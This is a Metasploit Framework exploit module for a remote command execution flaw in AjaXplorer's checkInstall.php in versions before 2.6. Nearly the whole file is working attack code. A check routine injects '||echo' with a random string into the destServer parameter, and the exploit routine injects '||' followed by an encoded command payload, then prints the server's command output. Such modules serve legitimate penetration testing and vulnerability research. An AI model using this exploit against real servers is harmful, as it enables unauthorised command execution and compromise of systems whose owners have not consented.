# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AjaXplorer checkInstall.php Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an arbitrary command execution vulnerability in the
        AjaXplorer &#039;checkInstall.php&#039; script. All versions of AjaXplorer prior to
        2.6 are vulnerable.
      },
      &#039;Author&#039;         =>
        [
          &#039;Julien Cayssol&#039;,  #Credited according to SecurityFocus
          &#039;David Maciejak&#039;,  #Metasploit module
          &#039;sinn3r&#039;           #Final touch on the Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;63552&#039; ],
          [ &#039;BID&#039;, &#039;39334&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 512,
          &#039;Compat&#039;      =>
            {
              &#039;ConnectionType&#039; => &#039;find&#039;,
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl ruby python bash telnet&#039;
            }
        },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;bsd&#039;, &#039;linux&#039;, &#039;osx&#039;, &#039;windows&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;AjaXplorer 2.5.5 or older&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Apr 4 2010&#039;,
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to AjaXplorer&#039;, &#039;/AjaXplorer-2.5.5/&#039;])
      ], self.class)
  end

  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    clue = Rex::Text::rand_text_alpha(rand(5) + 5)

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;      => "#{target_uri.path}plugins/access.ssh/checkInstall.php",
      &#039;vars_get&#039; => {
        &#039;destServer&#039;    => "||echo #{clue}"
      }
    })

    # If the server doesn&#039;t return the default redirection, probably something is wrong
    if res and res.code == 200 and res.body =~ /#{clue}/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;

    # Trigger the command execution bug
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;      => "#{target_uri.path}plugins/access.ssh/checkInstall.php",
      &#039;vars_get&#039; =>
        {
          &#039;destServer&#039;    => "||#{payload.encoded}"
        }
      })

    if res
      print_status("#{peer} - The server returned: #{res.code} #{res.message}")
      m = res.body.scan(/Received output:\s\[([^\]]+)\]/).flatten[0] || &#039;&#039;

      if m.empty?
        print_error("#{peer} - This server may not be vulnerable")
      else
        print_status("#{peer} - Command output from the server:")
        print_line(m)
      end
    end
  end

end

=begin
Repo:
http://sourceforge.net/projects/ajaxplorer/files/ajaxplorer/2.6/
=end



